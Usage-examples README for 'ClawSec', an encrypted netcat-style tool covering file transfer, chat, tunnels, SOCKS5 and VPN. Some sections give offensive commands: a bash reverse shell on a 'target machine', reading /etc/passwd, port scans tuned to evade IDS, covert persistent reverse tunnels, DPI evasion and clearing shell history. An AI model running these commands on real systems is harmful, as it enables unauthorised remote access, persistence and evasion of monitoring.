# ClawSec Usage Examples

## Basic Connection Test

### Terminal 1 (Server)
```bash
cd unix
./clawsec -l -p 9999 -k "TestPassword123" -v
```

### Terminal 2 (Client)
```bash
cd unix
echo "Hello encrypted world" | ./clawsec localhost 9999 -k "TestPassword123" -v
```

## File Transfer

Secure file transmission with auto-close and statistics.

### Send a file
```bash
# Receiver (server)
./clawsec -v -l -p 8080 -k "SecureFile2025" > received.tar.gz

# Sender (client)
./clawsec -v -k "SecureFile2025" 192.168.1.100 8080 < backup.tar.gz
```

**Output:**
```
[Transfer complete] Sent 1024768 bytes
[Transfer complete] Received 1024768 bytes
```

## Interactive Chat Mode

Encrypted real-time chat with timestamps and colored output.

Both sides need `-c` flag for chat mode:

```bash
# Server
./clawsec -l -p 4444 -k "ChatPassword" -c

# Client
./clawsec -k "ChatPassword" -c server.example.com 4444
```

**Output:**
```
[10:30:15 Server] Hello!
[10:30:18 Client] Hi there, connection is encrypted!
```

## Reverse Shell Mode

Interactive shell with PTY support (vim, nano, top work correctly).

```bash
# Server (target machine)
./clawsec -l -p 8888 -k "ShellPassword" -e /bin/bash

# Client (your machine)
./clawsec -k "ShellPassword" target.example.com 8888
```

**Available commands:**
```bash
ls -la
pwd
whoami
cat /etc/passwd
vim file.txt    # Interactive editors work!
top             # Interactive programs work!
exit            # Close connection
```

## Common Errors

### Missing password option
```bash
# Wrong
./clawsec -l -p 1234
# Error: Encryption password required

# Correct
./clawsec -l -p 1234 -k "YourPassword"
```

### Password mismatch
```bash
# Server
./clawsec -l -p 1234 -k "Password1"

# Client  
./clawsec localhost 1234 -k "Password2"
# Error: Decryption/authentication failed

# Both must use same password
```

## Advanced Options

### Keep-open (multi-client server)
```bash
# Server accepts multiple clients, fork per connection
./clawsec -l -p 8888 -k "Pass" -K

# Clients connect one by one or in parallel
./clawsec -k "Pass" server.example.com 8888
```

### Port forwarding (encrypted tunnel)
```bash
# Forward remote port 3306 (MySQL) through encrypted tunnel
# Server side:
./clawsec -l -p 9999 -k "Pass" -L 127.0.0.1:3306

# Client connects and gets access to MySQL via the tunnel
./clawsec -k "Pass" server.example.com 9999
```

### Compressed file transfer with verification
```bash
# Receiver
./clawsec -l -p 8080 -k "Pass" -z -P -V > backup.tar.gz

# Sender
./clawsec -k "Pass" -z -P -V server.example.com 8080 < backup.tar.gz
```

### Connection timeout
```bash
./clawsec -k "Pass" -w 30 server.example.com 5555
```

### Verbose debugging
```bash
./clawsec -l -p 7777 -k "Pass" -v
```

### Combining options
```bash
# Chat mode with verbose output
./clawsec -l -p 4444 -k "Pass" -c -v

# Reverse shell with timeout
./clawsec -k "Pass" -w 30 -e /bin/bash server.example.com 8888
```

## Stealth Mode (Anti-DPI / Anti-Fingerprint)

### TLS 1.3 camouflage — traffic looks like HTTPS
```bash
# Server on port 443 — indistinguishable from a regular HTTPS server
./clawsec -l -p 443 -k "StealthPass" --obfs tls

# Client — DPI sees a normal TLS 1.3 handshake
./clawsec -k "StealthPass" --obfs tls server.example.com 443
```

### HTTP obfuscation — traffic looks like web requests
```bash
# Server
./clawsec -l -p 80 -k "Pass" --obfs http

# Client
./clawsec -k "Pass" --obfs http server.example.com 80
```

### Maximum stealth — all anti-fingerprint features combined
```bash
# Server: TLS + ECH + padding + jitter
./clawsec -l -p 443 -k "MaxStealth" --obfs tls --ech --pad --jitter 100

# Client: same flags required on both sides
./clawsec -k "MaxStealth" --obfs tls --ech --pad --jitter 100 server.example.com 443
```

### Encrypted Client Hello (hide SNI from DPI)
```bash
# --ech adds GREASE ECH extension to TLS ClientHello
# DPI cannot see the target hostname in the handshake
# Automatically enables TLS mode if not already set
./clawsec -l -p 443 -k "Pass" --ech
./clawsec -k "Pass" --ech server.example.com 443
```

### Multiplexed tunnel (multiple connections, one tunnel)
```bash
# Server: demux streams to internal web server
./clawsec -l -p 4430 -k "MuxPass" -L internal.host:80 --mux

# Client: listen locally on 8080, tunnel to server
# All connections to localhost:8080 go through the encrypted tunnel
./clawsec -k "MuxPass" -p 8080 --mux server.example.com 4430

# Now: curl http://localhost:8080 → encrypted → internal.host:80
```

### Mux + TLS + ECH (maximum stealth tunnel)
```bash
# Server
./clawsec -l -p 443 -k "Pass" -L db.internal:5432 --mux --ech

# Client: encrypted PostgreSQL tunnel on localhost:5432
./clawsec -k "Pass" -p 5432 --mux --ech server.example.com 443
```

### Fallback (REALITY-like active probing resistance)
```bash
# Server: DPI probes see a real nginx website
./clawsec -l -p 443 -k "Pass" --fallback 127.0.0.1:80

# Client: sends knock before ECDHE handshake
./clawsec -k "Pass" --fallback 127.0.0.1:80 server.example.com 443

# Test: curl sees the real site, not ClawSec
# curl https://server.example.com  → nginx welcome page
```

### Ultimate stealth: fallback + fingerprint + ECH + pad + jitter + TOFU
```bash
# Server: real site fallback + maximum anti-fingerprint + identity verification
./clawsec -l -p 443 -k "MaxPass" --fallback 127.0.0.1:80 --ech --pad --jitter 100 --tofu

# Client: looks exactly like Chrome to DPI, with TOFU identity verification
./clawsec -k "MaxPass" --fallback 127.0.0.1:80 --fingerprint chrome --ech --pad --jitter 100 --tofu server.example.com 443
```

### TOFU (Trust On First Use — SSH-like identity)
```bash
# Server: generates persistent Ed25519 identity in ~/.clawsec/identity
./clawsec -l -p 9999 -k "Pass" --tofu
# Output: TOFU: Fingerprint: a878173a8313f99689c42e50bdd108fd...

# Client: first connection saves fingerprint to ~/.clawsec/known_hosts
./clawsec -k "Pass" --tofu server.example.com 9999
# Output: TOFU: New server identity for server.example.com:9999

# Client: subsequent connections verify identity
./clawsec -k "Pass" --tofu server.example.com 9999
# If server key changed: WARNING: SERVER IDENTITY HAS CHANGED!
```

### TLS fingerprinting (browser mimicry)

> **Note:** `--fingerprint` is **client-side only** — it shapes the outgoing TLS ClientHello.  
> The server does NOT need `--fingerprint`.

```bash
# Client looks like Chrome 124+ to DPI (cipher suites, ALPN, extensions)
./clawsec -k "Pass" --fingerprint chrome server.example.com 443

# Client looks like Firefox 125+
./clawsec -k "Pass" --fingerprint firefox server.example.com 443

# Client looks like Safari 17+
./clawsec -k "Pass" --fingerprint safari server.example.com 443
```

### Packet padding only (uniform packet sizes)
```bash
# All packets become 1400 bytes — defeats size-based traffic analysis
./clawsec -l -p 8888 -k "Pass" --pad
./clawsec -k "Pass" --pad server.example.com 8888
```

### Timing jitter only (random delays)
```bash
# Add 0-50ms random delay between packets
./clawsec -l -p 8888 -k "Pass" --jitter 50
./clawsec -k "Pass" --jitter 50 server.example.com 8888
```

## Port Scanning & Banner Grabbing

### Stealth port scan with randomized order
```bash
# Scan common ports (1-1024)
./clawsec --scan 1-1024 target.example.com

# Scan specific range
./clawsec --scan 80-443 target.example.com

# Scan all 65535 ports
./clawsec --scan all target.example.com

# Scan with custom timeout and jitter (evade IDS)
./clawsec --scan 1-1024 --jitter 200 -w 3 target.example.com
```

### Banner grabbing (service detection)
```bash
# Scan and grab service banners
./clawsec --scan 1-1024 -b target.example.com

# Output:
#   22/tcp  open
#        └─ SSH-2.0-OpenSSH_9.6
#   80/tcp  open
#        └─ HTTP/1.1 200 OK
#   443/tcp open
```

## SOCKS5 Proxy (Encrypted Tunnel)

```bash
# Server: accept connections and proxy outbound
./clawsec -l -k "SocksPass" -p 9999 --socks 0

# Client: open local SOCKS5 proxy on port 1080
./clawsec -k "SocksPass" --socks 1080 server.example.com 9999

# Use with curl
curl --proxy socks5://127.0.0.1:1080 https://ifconfig.me

# Use with Firefox: Settings → Network → SOCKS5 → 127.0.0.1:1080

# Use with SSH through SOCKS5
ssh -o ProxyCommand='nc -x 127.0.0.1:1080 %h %p' user@internal.host

# Combine with stealth mode
./clawsec -k "Pass" --socks 1080 --pq --obfs tls server.example.com 443
```

## Encrypted File Transfer (--send / --recv)

```bash
# Receiver: listen and save files to ./incoming/
./clawsec -l -k "FilePass" -p 4444 --recv ./incoming

# Sender: encrypt and transfer a file
./clawsec -k "FilePass" --send backup.tar.gz server.example.com 4444

# Features:
# - AES-256-GCM encryption during transfer
# - SHA-256 end-to-end integrity verification
# - Auto-resume on interrupted transfers (receiver keeps partial)
# - Progress bar with speed display
# - Path traversal protection on receiver

# Transfer with post-quantum security
./clawsec -k "Pass" --send secret.pdf --pq --obfs tls server.example.com 4444
```

## Reverse Tunnel (-R)

```bash
# Expose internal service to remote server (like SSH -R)

# Server: listen on 9999, open public port 8080 for reverse
./clawsec -l -k "RevPass" -p 9999 -R 0.0.0.0:8080 -v

# Client (behind NAT): connect and forward to local web app on :3000
./clawsec -k "RevPass" -R 127.0.0.1:3000 -v server.example.com 9999

# Now: http://server.example.com:8080 → tunnel → client's localhost:3000

# Reverse SSH access (expose local SSH through tunnel)
./clawsec -l -k "Pass" -p 9999 -R 0.0.0.0:2222
./clawsec -k "Pass" -R 127.0.0.1:22 server.example.com 9999
# ssh -p 2222 server.example.com → arrives at client's sshd

# Covert reverse tunnel (stealth)
./clawsec -k "Pass" -R 127.0.0.1:22 --pq --obfs tls --persistent server.com 443
```

## Persistent Auto-Reconnect

```bash
# Client auto-reconnects on disconnect (exponential backoff 1s → 60s)
./clawsec -k "Pass" --persistent -R 127.0.0.1:22 server.example.com 9999

# Works with any mode:
./clawsec -k "Pass" --persistent --socks 1080 server.example.com 443
./clawsec -k "Pass" --persistent -L 127.0.0.1:5432 server.example.com 9999

# Ideal for:
# - Unstable networks (mobile, satellite, roaming)
# - Long-running tunnels that survive network changes
# - Pentest persistent channels (with --obfs tls --pq)
```

## TUN VPN Mode

**Requirements:**
- Root/sudo for TUN device creation
- Server needs a **public IP** (static or dynamic) or port forwarding on the router
- Behind CGNAT? Use a cheap VPS as relay, or ask your ISP for a public IP
- Dynamic IP? Use DDNS (noip.com, duckdns.org) for a stable hostname

```bash
# Zero-config encrypted VPN

# Server (public IP or port-forwarded) — VPN gateway with NAT:
sudo ./clawsec -l -k "VpnSecret" -p 9000 --tun 10.0.0.1/24 --masquerade

# Client — ALL internet traffic through VPN:
sudo ./clawsec -k "VpnSecret" vpn.example.com 9000 --tun 10.0.0.2/24 --default-route

# Now ALL your traffic goes through the server:
curl ifconfig.me       # shows server's IP
ping google.com        # goes through VPN
# Ctrl+C to disconnect — original routes auto-restored

# Without --default-route, only VPN subnet (10.0.0.x) goes through tunnel
# With --default-route, everything goes through VPN (full tunnel mode)

# Quantum-resistant VPN with auto-reconnect:
sudo ./clawsec -k "Pass" --tun 10.0.0.2/24 --default-route --pq --persistent vpn.example.com 9000

# Stealth VPN (disguised as HTTPS traffic):
sudo ./clawsec -k "Pass" --tun 10.0.0.2/24 --default-route --obfs tls --persistent vpn.example.com 443

# Dynamic IP server with DDNS:
sudo ./clawsec -k "Pass" --tun 10.0.0.2/24 --persistent myvpn.ddns.net 9000

# No public IP? Use a $3/mo VPS as relay:
# VPS:    ./clawsec -l -k "Pass" -p 9000 --tun 10.0.0.1/24 --masquerade
# Client: sudo ./clawsec -k "Pass" vps.example.com 9000 --tun 10.0.0.2/24

# Multiple clients (each with unique IP):
# Client 1: --tun 10.0.0.2/24
# Client 2: --tun 10.0.0.3/24
# Client 3: --tun 10.0.0.4/24
```

## Security Best Practices

1. Never use default or weak passwords
2. Minimum 12 characters recommended
3. Share passwords through secure channels only
4. Clear command history after use: `history -c`
5. Use environment variables for automation:

```bash
export CLAW_PASS="YourSecurePassword"
./clawsec -l -p 1234 -k "$CLAW_PASS"
```
